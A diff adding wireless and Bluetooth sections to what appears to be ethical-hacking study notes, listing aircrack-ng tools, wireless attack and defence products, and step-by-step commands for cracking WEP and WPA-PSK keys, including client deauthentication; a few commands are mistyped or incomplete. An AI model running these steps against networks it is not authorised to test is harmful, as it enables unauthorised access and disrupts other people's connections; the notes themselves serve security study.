@@ -970,6 +970,117 @@ Tags:
 <br>
 <br>
 
+# Wireless Networks 
+
+## Aircrack-ng suite 
+> http://www.aircrack-ng.org 
+
+network software suite constisting of a lot of tools for 802.11 wireless networks. Runs under Windows and Linux
+
+1. airbase-ng: It captures the WPA/WPA2 handshake and can act as an ad-hoc AP. 
+2. aircrack-ng: This program is the de facto WEP and WPA/WPA2 PSK cracking tool.
+3. airdecap-ng: It decrypts WEP/WPA/ WPA2 and can be used to strip wireless headers from Wi-Fi packets.
+4. airgraph-ng: This program creates a client–AP relationship and common probe graph from an airodump file.
+5. airmon-ng: It is used to switch from the managed mode to the monitor mode on wireless interfaces and vice versa.
+6. airtun-ng: It creates a virtual tunnel interface to monitor encrypted traffic and inject arbitrary traffic into a network.
+7. easside-ng: This program allows the user to communicate via a WEP-encrypted AP without knowing the WEP key.
+8. packetforge-ng: Attackers can use this program to create encrypted packets that can subsequently be used for injection.
+9. airdecloack-ng: It removes WEP cloaking from a pcap file.
+10. airdrop-ng: This program is used for the targeted, rule-based de-authentication of users.
+11. aireplay-ng: It is used for traffic generation, fake authentication, packet replay, and ARP request injection.
+12. wesside-ng: This program incorporates various techniques to seamlessly obtain a WEP key in minutes.
+13. airodump-ng: This program is used to capture packets of raw 802.11 frames and collect WEP IVs.
+14. airolib-ng: This program stores and manages ESSID and password lists used in WPA/ WPA2 cracking.
+15. airserv-ng: It allows multiple programs to independently use a Wi-Fi card via a client–server TCP connection.
+16. tkiptun-ng: It injects frames into a WPA TKIP network with QoS and can recover MIC keys and keystreams from Wi-Fi traffic.
+17. WZCook: It is used to recover WEP keys from the Wireless Zero Configuration utility of Windows XP.
+
+## AirMagnet WiFi Analyzer PRO 
+
+> https://www.netally.com
+
+AirMagnet WiFi Analyzer PRO is a Wi-Fi network traffic auditing and troubleshooting tool that provides the real-time, accurate, independent, and reliable Wi-Fi analysis of 802.11a/b/g/n/ax wireless networks missing any traffic.
+
+Attackers use AirMagnet WiFi Analyzer PRO to gather details such as wireless network connectivity, Wi-Fi coverage, performance, roaming, interference, and network security issues.
+Module 
+
+## Others Wireless Attack Tools
+
+- Ettercap: https://www.ettercap-project.org 
+- Wifiphisher: https://wifiphisher.org
+- Reaver: su github
+- Fern Wifi Cracker: su github
+- Elcomsoft Wireless Security Auditor: https://www.elcomsoft.com
+
+
+## Examples
+
+### cracking wep - AirCrack-ng
+
+1. Run airmon in monitor mode:
+> airmon-ng start [interface] 
+
+2. start airodump to discover SSIDs on interface and keep it running
+> airodump-ng --ivs --write capture [interface] 
+
+3. associate your wireless card with the target AP
+> aireplay-ng -1 0 -e [TARGET_SSID_CAPTURED] -a [target_MAC_ADDRESS] -h [YOUR_MAC_ADDRESS] [interface] 
+
+4. inject packets using aireplay-ng to generate traffic on the target AP
+> aireplay-ng -3 -b [target_MAC_ADDRESS] -h [your-mac-address] [interface]
+
+5. wait for airodump to capture more than 50000 IVs, then crack WEB key using aircrack
+> aircrack-ng -s capture.ivs
+
+### cracking WPA-PSK Using aircrack-ng
+1. monitor wireless traffic using airmon
+> airmon-ng start [interface]
+
+2. collect wireless traffic data using airodump
+> airodump-ng --write capture [interface]  
+
+3. deauth the client using aireplay. the client will try to authenticate -> airodump will capture an auth packet (WPA handshake)
+> aireplay -ng --deauth 11 -a [client_mac_address]
+
+4. run the capture file through aircrack
+> aircrack-ng.exe -a 2 -w capture.cap
+
+
+## Security Tools for Wireless
+
+- Cisco Adaptive Wireless IPS: https://www.cisco.com 
+- AirMagnet WiFi Analyzer PRO: https://www.netally.com
+- RFProtect: https://www.arubanetworks.com
+- WatchGuard WIPS: https://www.watchguard.com
+- AirMagnet Planner: https://www.netally.com
+- Extreme AirDefense: https://www.extremenetworks.co
+
+# Bluetooth Attacks
+
+## BluetoothView
+> https://www.nirsoft.net
+
+BluetoothView is a utility that monitors the activity of Bluetooth devices in the vicinity. For each detected Bluetooth device, it displays information such as device name, Bluetooth address, major device type, minor device type, first detection time, and last detection time. It can also provide a notification when a new Bluetooth device is detected.
+
+## Other tools
+
+- BlueZ: http://www.bluez.org 
+- BtleJack: su github
+- BTCrawler: http://petronius.sourceforge.net
+- BlueScan: http://bluescanner.sourceforge.net
+- Bluetooth Scanner – btCrawler: su google play
+
+
+
+
+<br>
+<br>
+
+-----
+
+<br>
+<br>
+
 # REVERSE SHELL
 
 ## bersaglio Linux
